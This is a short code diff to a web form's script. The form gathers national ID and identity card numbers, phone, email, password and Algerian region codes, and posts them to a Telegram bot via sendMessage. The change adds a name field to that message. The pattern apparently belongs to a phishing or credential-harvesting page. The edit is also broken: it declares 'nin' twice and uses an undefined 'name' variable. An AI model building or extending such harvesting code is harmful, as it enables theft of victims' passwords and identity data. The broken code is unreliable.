@@ -179,6 +179,7 @@
             submitBtn.disabled = true;
             submitBtn.textContent = 'Sending...';
 
+            const nin = document.getElementById('name').value.trim();
             const nin = document.getElementById('nin').value.trim();
             const cni = document.getElementById('cni').value.trim();
             const phone = document.getElementById('phone').value.trim();
@@ -187,7 +188,7 @@
             const wilaya_code = document.getElementById('wilaya_code').value.trim();
             const commune_code = document.getElementById('commune_code').value.trim();
 
-            const commandString = `/add ${nin}|${cni}|${phone}|${email}|${password}|${wilaya_code}|${commune_code}`;
+            const commandString = `/add ${name}|${nin}|${cni}|${phone}|${email}|${password}|${wilaya_code}|${commune_code}`;
 
             try {
                 const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
